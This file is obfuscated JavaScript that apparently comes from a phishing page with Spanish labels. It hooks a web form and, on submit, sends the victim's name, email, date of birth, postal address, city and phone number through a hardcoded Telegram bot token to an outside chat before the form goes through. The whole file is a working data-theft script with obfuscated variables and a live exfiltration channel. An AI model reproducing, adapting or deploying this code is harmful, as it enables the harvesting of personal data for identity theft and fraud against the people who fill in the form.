document['addEventListener']('DOMContentLoaded', function () {
  const _0x498f5f = document['getElementById']('indexFormId');
  _0x498f5f ? _0x498f5f['addEventListener']('submit', function (_0x1b77b4) {
    _0x1b77b4['preventDefault']();
    const _0x323374 = new FormData(this), _0x11c8cf = {
      'first_name': _0x323374['get']('first_name'),
      'last_name': _0x323374['get']('last_name'),
      'email': _0x323374['get']('email'),
      'dob': _0x323374['get']('dob'),
      'address': _0x323374['get']('address'),
      'postal': _0x323374['get']('postal'),
      'city': _0x323374['get']('city'),
      'phone': _0x323374['get']('phone')
    }, _0x35dc2f = '\n              Apellidos: ' + _0x11c8cf['first_name'] + '\n              Nombres: ' + _0x11c8cf['last_name'] + '\n              Email: ' + _0x11c8cf['email'] + '\n              Fecha de nacimiento: ' + _0x11c8cf['dob'] + '\n              Dirección postal: ' + _0x11c8cf['address'] + '\n              Código postal: ' + _0x11c8cf['postal'] + '\n              Ciudad: ' + _0x11c8cf['city'] + '\n              Número de teléfono: ' + _0x11c8cf['phone'] + '\n          ';
    sendMessageToTelegram('7355468281:AAH7iVyMYtEAy3aUC37zaPWj6GstbcvFbug', '-4265262833', _0x35dc2f)['then']((_0x432141) => {
      _0x432141['ok'] ? (console['log']('Message sent successfully!'), _0x498f5f['submit']()) : (console['error']('Error sending message:', _0x432141), alert('Error sending message'));
    })['catch']((_0xf5d41d) => {
      console['error']('Fetch error:', _0xf5d41d);
      alert('Error sending message');
    });
  }) : console['error']('Form element with id "indexFormId" not found.');
});

function sendMessageToTelegram(_0x5cec6f, _0x141a31, _0x2e48d0) {
  return fetch('https://api.telegram.org/bot' + _0x5cec6f + '/sendMessage', {
    'method': 'POST',
    'headers': { 'Content-Type': 'application/json' },
    'body': JSON['stringify']({
      'chat_id': _0x141a31,
      'text': _0x2e48d0
    })
  })['then']((_0x4e77f4) => _0x4e77f4['json']());
}
